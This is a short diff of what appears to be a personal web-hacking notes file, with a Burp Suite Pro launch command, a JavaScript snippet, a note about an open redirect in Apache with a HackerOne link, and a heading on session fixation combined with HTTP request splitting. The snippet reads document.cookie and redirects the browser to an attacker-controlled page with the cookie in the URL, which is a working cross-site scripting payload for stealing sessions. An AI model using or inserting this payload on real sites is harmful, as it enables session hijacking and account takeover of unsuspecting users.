@@ -92,8 +92,9 @@ java -jar -Xmx512M -Djava.awt.headless=true ./burpsuite_pro_v1.8.8.jar http exmp
 }
 else{ 
     var cookie = document.cookie; 
-document.location=“https://my_own_domain/attacker.html?cookie="+cookie;
-}
+document.location=“https://my_own_domain/attacker.html?cookie="+cookie;}
+...................................................................................
+apache 2.4.3 has open redirect in server /login >> https://hackerone.com/reports/1782514
  
  ----------------------------------------------------------------------------------------------
             Combining Session Fixation With Http Request Splitting 
